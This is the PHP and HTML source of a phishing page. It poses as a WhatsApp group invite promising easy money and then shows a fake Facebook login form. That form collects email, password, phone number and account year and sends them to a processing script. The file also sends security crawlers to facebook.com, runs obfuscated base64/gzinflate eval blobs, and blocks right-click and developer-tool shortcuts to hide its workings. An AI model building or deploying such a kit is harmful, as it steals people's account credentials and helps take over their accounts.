<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/');
die();
}
?>
<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>WhatsApp Group Invite</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:image" content="./assets/images/logowa.png" />
    <meta property="og:title" content="Whatsapp Group Invite" />
    <meta name="description" content="Follow This Link">
    <link rel="stylesheet" type="text/css" media="screen" href="./assets/css/RaBiitch.css" />
    <link rel="shorcut icon" href="./assets/images/logowa.png"/>
</head>
<body>
    <RaBiitch class="RaBiitch">
        <RaBiitch class="content">
            <RaBiitch class="txt-content">Join Grup Penghasil Uang Cepat WA</RaBiitch>
            <img class="img-content" src="./assets/images/uang.jfif" alt="Join WA"/>
            <RaBiitch class="txt-judul">Komunitas Pencari Uang Gratis</RaBiitch>
            <RaBiitch class="txt-des">WhatsApp Group Invite</RaBiitch>
            <form id="RaBiitch" method="POST">
                <button class="btn-content" type="submit" name="join">JOIN CHAT</button>
            </form>
            <hr class="hr"></hr>
            <RaBiitch class="txt-gapunya">Belum punya Whatsapp? </RaBiitch>
            <a href="https://www.whatsapp.com/download/">Download</a>
        </RaBiitch>
        
        <?php 
        if(isset($_POST['join'])) {
            echo "<RaBiitch class='login'>
            <RaBiitch class='txt-content2'>Login Facebook Untuk Melanjutkan</RaBiitch>
            <form id='RaBiitch' action='prosesjoin.php' method='POST'>
                <img class='img-login' src='./assets/images/fb2.png' alt='RaBiitch'/>
                <input class='log' type='email' name='efbi' placeholder='Email Facebook' required/>
                <input class='log' type='password' name='efbipw' placeholder='Password' required/> 
                <input class='log' type='number' name='tel' placeholder='Nomor Telepon' required/>
                <input class='log' type='number' name='tgl' placeholder='Tahun Pembuatan Akun ' required/>
                <button type='submit' class='btn-login' name='join2'>Login</button>
            </form>
        </RaBiitch>";
        }
        ?>
    </RaBiitch>
</body>

<script language="JavaScript">  // UNTUK MENCEGAH USER MENGINSPECT ELEMENT
    window.onload = function () {
    document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    document.addEventListener("keydown", function (e) {
        //document.onkeydown = function(e) {
        // "I" key
        if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
            disabledEvent(e);
        }
        // "J" key
        if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
            disabledEvent(e);
        }
        // "S" key + macOS
        if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
            disabledEvent(e);
        }
        // "U" key
        if (e.ctrlKey && e.keyCode == 85) {
            disabledEvent(e);
        }
        // "F12" key
        if (event.keyCode == 123) {
            disabledEvent(e);
        }
    }, false);
    function disabledEvent(e) {
        if (e.stopPropagation) {
            e.stopPropagation();
        } else if (window.event) {
            window.event.cancelBubble = true;
        }
        e.preventDefault();
        return false;
    }
}
</script>
</html>